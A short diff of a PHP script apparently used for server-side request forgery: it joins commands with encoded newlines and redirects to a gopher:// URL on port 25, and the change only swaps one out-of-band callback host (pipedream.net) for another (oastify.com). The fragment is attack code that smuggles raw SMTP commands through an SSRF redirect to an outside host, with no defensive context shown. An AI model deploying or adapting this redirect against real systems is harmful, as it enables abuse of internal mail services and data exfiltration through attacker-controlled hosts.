@@ -10,5 +10,5 @@
 
         $payload = implode('%0A', $commands);
 
-        header('Location: gopher://enbp0bq4bhp8v.x.pipedream.net:25/_'.$payload);
+        header('Location: gopher://2svuk7wy01u9w66k6vsk615hk8qzep2e.oastify.com:25/_'.$payload);
 ?>
